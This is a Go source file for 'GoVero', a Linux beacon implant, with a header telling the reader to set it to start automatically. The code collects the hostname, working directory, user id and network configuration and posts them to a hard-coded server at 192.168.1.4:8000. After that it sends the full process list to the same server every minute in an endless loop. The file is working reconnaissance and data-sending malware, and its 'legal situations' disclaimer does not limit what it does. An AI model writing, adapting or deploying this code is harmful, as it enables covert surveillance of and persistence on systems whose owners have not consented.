/*
GoVero Is A Beacon Software, Use It Only In Legal Situations.
GoVero Sends A Request To Your Server Every Minute.
It Should Be Placed In A Location Where It'll Be Automatically Started Whenever The Device Is Up
THIS IS THE LINUX VERSION
*/

package main

import (
	"fmt"
	"net/http"
	"net/url"
	"os/exec"
	"runtime"
	"time"
)

func main() {
	// Recon Stage

	osinfo := runtime.GOOS
	if osinfo == "windows" {
		return
	}

	// Exfiltration

	hostname, err1 := exec.Command("hostname").Output()
	curdir, err2 := exec.Command("pwd").Output()
	userid, err3 := exec.Command("id").Output()
	networkinfo, err4 := exec.Command("ip", "a", "s").Output()

	if err1 != nil || err2 != nil || err3 != nil || err4 != nil {
		fmt.Print(err1, err2, err3, err4)
	}

	data := url.Values{
		"hostname": {string(hostname)},
		"pwd":      {string(curdir)},
		"userid":   {string(userid)},
		"network":  {string(networkinfo)},
	}

	http.PostForm("http://192.168.1.4:8000/core/", data)

	ss := true
	for ss {
		process, err9 := exec.Command("ps", "-A").Output()
		datas := url.Values{}
		if err9 != nil {
			datas = url.Values{
				"msg":       {"Still Alive"},
				"processes": {"ERROR"},
			}
		} else {
			datas = url.Values{
				"msg":       {"Still Alive"},
				"processes": {string(process)},
			}
		}
		http.PostForm("http://192.168.1.4:8000/core/beacon/", datas)
		time.Sleep(60 * time.Second)
	}
}
